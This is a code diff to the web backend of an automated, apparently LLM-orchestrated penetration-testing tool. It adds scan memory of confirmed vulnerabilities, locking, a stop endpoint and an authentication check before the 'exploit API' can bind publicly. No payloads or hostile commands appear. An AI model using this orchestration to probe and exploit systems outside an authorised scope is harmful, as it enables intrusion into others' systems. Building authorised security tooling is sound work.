+        # Persist this run's knowledge (confirmed vulns, API paths, agentic
+        # probe outcomes, origins) so the next scan on this target starts
+        # from confirmed attack surface instead of rediscovering it.
+        try:
+            mem_ok = save_scan_memory(domain, data)
+            mem_n = len(data.get("bb_agentic") or []) + len(data.get("findings") or [])
+            log_state(f"Scan memory saved ({'ok' if mem_ok else 'failed'}; {mem_n} artifacts)")
+        except Exception as _me:
+            log_state(f"Scan memory save failed: {_me}")
         save_scan_history(eid)
 
     except Exception as e:
@@ -5501,10 +6255,11 @@ class EngageRequest(BaseModel):
     exclusions: List[str] = []
 
 class RunRequest(BaseModel):
-    problem: str
+    problem: str = ""
     base_url: str = ""
     model: str = ""
     api_key: str = ""
+    mode: str = ""  # "pipeline" (fixed stages) or "llm" (model-driven orchestration); empty = keep engagement's mode
 
 class ModelsRequest(BaseModel):
     base_url: str
@@ -5526,49 +6281,108 @@ def discover_models_post(req: ModelsRequest):
 def create_engagement(req: EngageRequest):
     eid = uuid.uuid4().hex[:8]
     code = _session_code()
-    DB[eid] = {
-        "id": eid, "code": code, "name": req.name, "scope": ",".join(req.scope),
-        "status": "idle", "logs": [], "progress": "Created",
-        "report": "", "report_path": "", "report_filename": "",
-        "base_url": "", "model": "", "api_key": "", "prompt": "",
-        "events": [], "chat": [],
-    }
+    with DB_LOCK:
+        DB[eid] = {
+            "id": eid, "code": code, "name": req.name, "scope": ",".join(req.scope),
+            "exclusions": list(req.exclusions or []),
+            "status": "idle", "logs": [], "progress": "Created",
+            "report": "", "report_path": "", "report_filename": "",
+            "base_url": "", "model": "", "api_key": "", "prompt": "",
+            "events": [], "chat": [],
+        }
+        persist_engagement(eid, lock_held=True)
     return {"id": eid, "code": code}
 
 @app.post("/api/engagements/{eid}/run")
 def run_engagement(eid: str, req: RunRequest):
-    if eid not in DB:
-        raise HTTPException(404, "engagement not found")
-    eng = DB[eid]
-    if eng["status"] == "running":
-        raise HTTPException(409, "already running")
+    with DB_LOCK:
+        if eid not in DB:
+            raise HTTPException(404, "engagement not found")
+        eng = DB[eid]
+        if eng["status"] == "running":
+            raise HTTPException(409, "already running")
 
-    eng["status"] = "running"
-    eng["prompt"] = req.problem
-    eng["base_url"] = req.base_url
-    eng["model"] = req.model
-    eng["api_key"] = req.api_key
-    eng["logs"] = []
-    eng["events"] = []
-    eng["progress"] = "Starting..."
+        eng["status"] = "running"
+        eng.pop("_stop", None)
+        eng["prompt"] = req.problem or eng.get("prompt", "")
+        eng["base_url"] = req.base_url or eng.get("base_url", "")
+        eng["model"] = req.model or eng.get("model", "")
+        eng["api_key"] = req.api_key or eng.get("api_key", "")
+        if req.mode:
+            eng["mode"] = req.mode.lower()
+        elif not eng.get("mode"):
+            eng["mode"] = "pipeline"
+        eng.pop("error", None)
+        eng["progress"] = "Starting..."
+        if len(eng.get("logs", [])) > 2000:
+            eng["logs"] = eng["logs"][-1000:]
 
     def _timeout_watchdog(eid_ref, thread_ref, timeout_sec=300):
         thread_ref.join(timeout=timeout_sec)
-        if thread_ref.is_alive() and DB.get(eid_ref, {}).get("status") == "running":
-            eng_ref = DB[eid_ref]
-            eng_ref["status"] = "error"
-            eng_ref["error"] = f"Pipeline timed out after {timeout_sec}s"
-            eng_ref["logs"].append({"t": now(), "msg": eng_ref["error"]})
+        if thread_ref.is_alive():
+            with DB_LOCK:
+                if DB.get(eid_ref, {}).get("status") == "running":
+                    eng_ref = DB[eid_ref]
+                    eng_ref["status"] = "error"
+                    eng_ref["error"] = f"Pipeline timed out after {timeout_sec}s"
+                    eng_ref["logs"].append({"t": now(), "msg": eng_ref["error"]})
             meta_state.update({"task_id": eid_ref, "status": "failed"})
             emit_sync("meta", dict(meta_state))
             emit_sync("done", {"status": "failed"})
 
     t = threading.Thread(target=run_oneshot, args=(eid,), daemon=True)
+    if eng["mode"] == "llm":
+        if not eng["base_url"] or not eng["model"]:
+            with DB_LOCK:
+                eng["status"] = "error"
+                eng["error"] = "LLM mode requires base_url + model"
+            raise HTTPException(400, "LLM mode requires base_url + model")
+        from orchestrator import run_llm
+        t = threading.Thread(target=run_llm, args=(eid,), daemon=True)
+    elif eng["mode"] == "trinity":
+        t = threading.Thread(target=run_trinity, args=(eid,), daemon=True)
     t.start()
     import os as _os
     _to = int(_os.environ.get("DRDOOM_PIPELINE_TIMEOUT", "3600"))
+    if eng["mode"] == "llm":
+        _to = int(_os.environ.get("DRDOOM_LLM_TIMEOUT", "86400"))
     watchdog = threading.Thread(target=_timeout_watchdog, args=(eid, t, _to), daemon=True)
     watchdog.start()
+    _schedule_persist(eid)
+    return {"ok": True}
+
+
+def _schedule_persist(eid):
+    """Background snapshotter: persist the engagement every 15s while it runs,
+    then a final snapshot when the worker thread exits."""
+    def _persist_loop():
+        while True:
+            with DB_LOCK:
+                eng = DB.get(eid)
+                status = (eng or {}).get("status", "")
+            if not eng:
+                return
+            persist_engagement(eid)
+            if status != "running":
+                return
+            time.sleep(15)
+    threading.Thread(target=_persist_loop, daemon=True).start()
+
+
+@app.post("/api/engagements/{eid}/stop")
+def stop_engagement(eid: str):
+    """Stop a running scan gracefully. The orchestrator checks the stop flag
+    between steps; in-flight probes finish, then the run finalizes a report
+    from everything found so far."""
+    with DB_LOCK:
+        if eid not in DB:
+            raise HTTPException(404, "not found")
+        eng = DB[eid]
+        if eng["status"] != "running":
+            return {"ok": False, "detail": f"engagement status is '{eng['status']}', nothing running"}
+        eng["_stop"] = True
+        eng["logs"].append({"t": now(), "msg": "stop requested — finishing current step, then finalizing"})
+    _log("info", f"stop requested for {eid}")
     return {"ok": True}
 
 @app.post("/api/models/check")
@@ -5585,31 +6399,32 @@ class ChatRequest(BaseModel):
 @app.post("/api/engagements/{eid}/chat")
 def chat_engagement(eid: str, req: ChatRequest):
     """Chat with the model about engagement findings."""
-    if eid not in DB:
-        raise HTTPException(404, "not found")
-    eng = DB[eid]
-    base_url = eng.get("base_url", meta_state.get("base_url", ""))
-    model = eng.get("model", "")
-    api_key = eng.get("api_key", "not-needed")
-    if not base_url or not model:
-        raise HTTPException(400, "no model configured for this engagement")
-    if "chat" not in eng:
-        eng["chat"] = []
-    context = ""
-    if eng.get("report"):
-        context = f"The full engagement report is available. The target was {eng.get('scope', '?')}.\n\nReport summary:\n{eng['report'][:2000]}"
-    elif eng.get("events"):
-        summaries = []
-        for ev in eng["events"][-30:]:
-            p = ev.get("payload", {})
-            t = ev.get("type", "")
-            if t == "message" and p.get("role") == "assistant":
-                summaries.append(f"AI: {p.get('text','')[:200]}")
-            elif t == "tool.result":
-                summaries.append(f"Tool {p.get('call_id','?')}: {p.get('status','?')} - {p.get('result','')[:100]}")
-            elif t == "verification":
-                summaries.append(f"Check {p.get('command','?')}: {'passed' if p.get('passed') else 'failed'}")
-        context = "Engagement findings:\n" + "\n".join(summaries[-15:])
+    with DB_LOCK:
+        if eid not in DB:
+            raise HTTPException(404, "not found")
+        eng = DB[eid]
+        base_url = eng.get("base_url", meta_state.get("base_url", ""))
+        model = eng.get("model", "")
+        api_key = eng.get("api_key", "not-needed")
+        if not base_url or not model:
+            raise HTTPException(400, "no model configured for this engagement")
+        if "chat" not in eng:
+            eng["chat"] = []
+        context = ""
+        if eng.get("report"):
+            context = f"The full engagement report is available. The target was {eng.get('scope', '?')}.\n\nReport summary:\n{eng['report'][:2000]}"
+        elif eng.get("events"):
+            summaries = []
+            for ev in eng["events"][-30:]:
+                p = ev.get("payload", {})
+                t = ev.get("type", "")
+                if t == "message" and p.get("role") == "assistant":
+                    summaries.append(f"AI: {p.get('text','')[:200]}")
+                elif t == "tool.result":
+                    summaries.append(f"Tool {p.get('call_id','?')}: {p.get('status','?')} - {p.get('result','')[:100]}")
+                elif t == "verification":
+                    summaries.append(f"Check {p.get('command','?')}: {'passed' if p.get('passed') else 'failed'}")
+            context = "Engagement findings:\n" + "\n".join(summaries[-15:])
 
     # PentestGPT-style interactive session commands against the task tree
     cmd = req.message.strip().lower()
@@ -5649,12 +6464,13 @@ def chat_engagement(eid: str, req: ChatRequest):
         messages.append({"role": "user" if m["role"] == "user" else "assistant", "content": m["text"]})
     messages.append({"role": "user", "content": req.message})
     result = call_model(base_url, model, api_key, messages, timeout=60)
-    eng["chat"].append({"role": "user", "text": req.message, "ts": now()})
     if result.startswith("AI_ERROR:"):
         reply = {"role": "assistant", "text": f"Error calling model: {result[9:]}", "ts": now()}
     else:
         reply = {"role": "assistant", "text": result, "ts": now()}
-    eng["chat"].append(reply)
+    with DB_LOCK:
+        eng["chat"].append({"role": "user", "text": req.message, "ts": now()})
+        eng["chat"].append(reply)
     # Broadcast chat events via SSE
     ev = {"type": "chat.message", "ts": datetime.now(timezone.utc).isoformat(), "source": {"pair": {"harness": "chat", "model": model}}, "payload": {"role": "user", "text": req.message}, "task_id": eid}
     emit_sync("ir", ev)
@@ -5664,9 +6480,10 @@ def chat_engagement(eid: str, req: ChatRequest):
 
 @app.get("/api/engagements/{eid}/chat")
 def get_chat(eid: str):
-    if eid not in DB:
-        raise HTTPException(404, "not found")
-    return {"messages": DB[eid].get("chat", [])}
+    with DB_LOCK:
+        if eid not in DB:
+            raise HTTPException(404, "not found")
+        return {"messages": DB[eid].get("chat", [])}
 
 class FreeChatRequest(BaseModel):
     message: str
@@ -5691,28 +6508,30 @@ def free_chat(req: FreeChatRequest):
 
 @app.get("/api/engagements/{eid}/state")
 def get_state(eid: str):
-    if eid not in DB:
-        raise HTTPException(404, "not found")
-    eng = DB[eid]
-    # Include scan findings data for the findings dashboard
-    scan_data = {k:v for k,v in eng.items() if k not in ("status","progress","logs","events","report","report_path","report_filename","error","scope","code","task_id","prompt","base_url","model","api_key","name","created_at","completed_at","_events") and v is not None}
-    return {
-        "code": eng.get("code", ""),
-        "status": eng["status"],
-        "progress": eng["progress"],
-        "logs": eng["logs"][-50:],
-        "events": eng.get("events", [])[-100:],
-        "report_ready": eng["status"] == "complete",
-        "report_filename": eng.get("report_filename", ""),
-        "error": eng.get("error", ""),
-        **scan_data,
-    }
+    with DB_LOCK:
+        if eid not in DB:
+            raise HTTPException(404, "not found")
+        eng = DB[eid]
+        # Include scan findings data for the findings dashboard
+        scan_data = {k:v for k,v in eng.items() if k not in ("status","progress","logs","events","report","report_path","report_filename","error","scope","code","task_id","prompt","base_url","model","api_key","name","created_at","completed_at","_events") and v is not None}
+        return {
+            "code": eng.get("code", ""),
+            "status": eng["status"],
+            "progress": eng["progress"],
+            "logs": eng["logs"][-50:],
+            "events": eng.get("events", [])[-100:],
+            "report_ready": eng["status"] == "complete",
+            "report_filename": eng.get("report_filename", ""),
+            "error": eng.get("error", ""),
+            **scan_data,
+        }
 
 @app.get("/api/engagements/{eid}/events")
 def get_events(eid: str):
     """Get all events for a session (for restoring UI after refresh)."""
-    if eid in DB:
-        return {"events": DB[eid].get("events", [])[-200:]}
+    with DB_LOCK:
+        if eid in DB:
+            return {"events": DB[eid].get("events", [])[-200:]}
     scans = load_scan_history()
     for s in scans:
         if s.get("id") == eid:
@@ -5721,18 +6540,20 @@ def get_events(eid: str):
 
 @app.get("/api/engagements/{eid}/report")
 def get_report(eid: str):
-    if eid not in DB:
-        raise HTTPException(404, "not found")
-    eng = DB[eid]
-    if not eng.get("report"):
-        raise HTTPException(404, "report not generated yet")
-    return {"report": eng["report"]}
+    with DB_LOCK:
+        if eid not in DB:
+            raise HTTPException(404, "not found")
+        eng = DB[eid]
+        if not eng.get("report"):
+            raise HTTPException(404, "report not generated yet")
+        return {"report": eng["report"]}
 
 def _report_source(eid):
     """Return (report_text, filename) from in-memory DB or persisted history."""
-    if eid in DB and DB[eid].get("report"):
-        eng = DB[eid]
-        return eng["report"], eng.get("report_filename") or f"{eid}.md"
+    with DB_LOCK:
+        if eid in DB and DB[eid].get("report"):
+            eng = DB[eid]
+            return eng["report"], eng.get("report_filename") or f"{eid}.md"
     for s in load_scan_history():
         if s.get("id") == eid and s.get("report"):
             return s["report"], s.get("report_filename") or f"{eid}.md"
@@ -5914,11 +6735,12 @@ async def event_stream(request: Request, eid: str = ""):
 
 # ─── FRONTEND ───────────────────────────────────────────────────
 
-FRONTEND_HTML = (Path(DATA_DIR) / "frontend.html").read_text(encoding="utf-8")
+def _frontend_html():
+    return (Path(DATA_DIR) / "frontend.html").read_text(encoding="utf-8")
 
 @app.get("/", response_class=HTMLResponse)
 def index():
-    return FRONTEND_HTML
+    return _frontend_html()
 
 @app.get("/marked.min.js")
 def marked_js():
@@ -5929,5 +6751,20 @@ def marked_js():
         raise HTTPException(404, "marked.min.js not found")
 
 if __name__ == "__main__":
+    import sys
     import uvicorn
-    uvicorn.run(app, host="0.0.0.0", port=8085)
+    host = os.environ.get("MRBOOM_HOST", "127.0.0.1")
+    port = int(os.environ.get("MRBOOM_PORT", "8085"))
+    for arg in sys.argv[1:]:
+        if arg.startswith("--host="):
+            host = arg.split("=", 1)[1]
+        elif arg.startswith("--port="):
+            port = int(arg.split("=", 1)[1])
+    if not _is_loopback(host) and not AUTH_KEY:
+        print("FATAL: binding to %s exposes the exploit API publicly. "
+              "Set MRBOOM_API_KEY (enforced via X-API-Key) or bind to 127.0.0.1." % host,
+              file=sys.stderr)
+        raise SystemExit(2)
+    if AUTH_KEY:
+        logger.info("auth gate enabled: X-API-Key required on /api/* and /events")
+    uvicorn.run(app, host=host, port=port)
